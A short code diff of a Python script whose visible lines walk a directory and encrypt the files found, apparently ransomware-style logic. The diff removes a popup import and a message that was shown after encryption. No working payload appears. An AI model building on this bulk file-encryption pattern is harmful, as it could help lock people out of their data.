@@ -23,7 +23,6 @@ import platform
 import socket
 import json
 from datetime import datetime
-from popup import popup_message
 
 user_os = "Windows"
 path_str = "\\"
@@ -241,5 +240,3 @@ def start_point():
         target = getFiles(directory)
         encrypt(target, file_path)
 
-    if not os.path.isfile(file_path):
-        print("Showing popup")
